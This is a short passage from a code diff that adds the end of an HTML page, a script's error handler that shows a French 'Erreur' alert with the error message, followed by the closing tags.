+    alert('Erreur : ' + err.message);
+  }
+}
+</script>
+</body>
+</html>
